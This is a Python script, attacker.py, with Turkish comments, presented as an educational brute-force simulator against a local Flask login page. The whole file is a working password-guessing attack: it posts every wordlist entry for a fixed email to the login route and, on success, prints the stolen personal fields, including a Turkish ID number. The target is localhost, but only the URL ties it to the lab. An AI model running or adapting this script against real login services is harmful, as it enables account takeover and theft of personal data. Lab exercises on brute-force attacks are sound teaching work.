#DOSYA: attacker.py (İstemci / Saldırgan Betiği)
#--------------------------------------------------------------------------------------------------------------------------------
#YASAL VE ETİK UYARI:
#- Bu betik, Brute-Force simülasyonunu anlamak amacıyla yazılmış basit bir eğitim projesidir.
#- Yalnızca kullanıcının kendi yerel bilgisayarındaki (localhost) kapalı laboratuvar ortamında test edilmek üzere tasarlanmıştır.
#- passwords.txt dosyası tamamen kendim tarafımdan oluşturulmuş olup denenecek şifreleri içermektedir.
#- Tamamen yasal bir yerel denemedir; kötü niyetli amaçlarla kullanılamaz.
#--------------------------------------------------------------------------------------------------------------------------------

import requests
import time
import sys
import webbrowser

# --- SALDIRI VE HEDEF YAPILANDIRMASI ---
TARGET_URL = "http://127.0.0.1:5000/login"      # Şifrelerin deneneceği hedef giriş rotu
DOSSIER_URL = "http://127.0.0.1:5000/breach"    # Şifre kırıldığında tarayıcıda açılacak gizli sızıntı paneli
TARGET_EMAIL = "example@example.com"            # Hedef alınan kullanıcı e-postası
WORDLIST_FILE = "passwords.txt"                 # Denenecek şifrelerin bulunduğu kelime listesi dosyası

# Terminal ekranı için şık bir başlangıç banner'ı yazdıran fonksiyon
def print_banner():
    print("\n" + "="*50)
    print(" 🛡️  CTF - BRUTE-FORCE SIMULATOR v1.0")
    print("="*50 + "\n")

# Ana saldırı döngüsünü ve otomasyonu yöneten fonksiyon
def run_attack():
    print_banner()
    print(f"[*] Hedef Sunucu Bağlandı: {TARGET_URL}")
    print(f"[*] Hedef E-posta: {TARGET_EMAIL}")
    print(f"[*] Wordlist yükleniyor ve tarama başlatılıyor...\n")
    time.sleep(1)

    # Wordlist dosyasını güvenli bir şekilde okuyup şifreleri bir liste içine aktarıyoruz
    try:
        with open(WORDLIST_FILE, "r", encoding="utf-8") as f:
            passwords = [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print(f"[-] HATA: '{WORDLIST_FILE}' dosyası bulunamadı!")
        return

    # Kelime listesindeki her bir şifreyi döngüye sokarak sırayla deniyoruz
    for pwd in passwords:
        time.sleep(0.3)  # Terminalde gerçekçi bir akış/bekleme efekti vermesi için
        
        # Sunucuya gönderilecek form verilerini hazırlıyoruz
        payload = {
            "email": TARGET_EMAIL,
            "password": pwd
        }
        
        # Sunucudan JSON formatında veri talep ettiğimizi belirten başlığı (header) ekliyoruz
        headers = {
            "Accept": "application/json"
        }

        try:
            # POST isteği ile şifreyi ve başlıkları hedef sunucuya gönderiyoruz
            response = requests.post(TARGET_URL, data=payload, headers=headers)
            
            # Eğer sunucu 200 (OK) döndürürse şifre doğru demektir!
            if response.status_code == 200:
                # BÜYÜK FİNAL: Sunucudan sızdırılan JSON verilerini yakalıyoruz
                data = response.json()
                user_data = data.get("dossier", {})

                print(f"\n\033[92m[+] SUCCESS! PASSWORD CRACKED --> {pwd}\033[0m")
                print("\033[92m[+] ACCESS GRANTED! HEDEF KULLANICI BİLGİLERİ SUNUCUDAN SIZDIRILDI!\033[0m\n")
                
                print("="*50)
                print(" 📂 SUNUCUDAN ÇEKİLEN GİZLİ VERİLER (EXFILTRATION):")
                print("="*50)
                print(f"  • Ad            : {user_data.get('ad')}")
                print(f"  • Soyad         : {user_data.get('soyad')}")
                print(f"  • Doğum Tarihi  : {user_data.get('dogum_tarihi')}")
                print(f"  • E-posta       : {user_data.get('email')}")
                print(f"  • Şifre         : {user_data.get('sifre')}")
                print(f"  • TC Kimlik No  : {user_data.get('tc_no')}")
                print("="*50)
                
                print("\n[i] Tarayıcıda sızıntı paneli açılıyor...")
                
                # Doğru şifre bulunduğunda gizli /breach sayfasını tarayıcımızda otomatik açıyoruz
                webbrowser.open(DOSSIER_URL) 
                return
            else:
                # Yanlış denemelerde terminale kırmızı renkte "Access Denied" yazdırıyoruz
                print(f"\033[91m[-] Deneniyor: {pwd:<12} --> [Access Denied]\033[0m")

        # Sunucu kapalıysa veya ulaşılamıyorsa alınabilecek bağlantı hatalarını yakalıyoruz
        except requests.exceptions.ConnectionError:
            print("[-] HATA: Hedef sunucuya ulaşılamıyor! Önce 'app.py'yi çalıştır.")
            return

    # Eğer liste biter ve doğru şifre bulunamazsa verilecek bilgi mesajı
    print("\n[-] Tarama tamamlandı. Doğru şifre listede yok.")

if __name__ == "__main__":
    run_attack()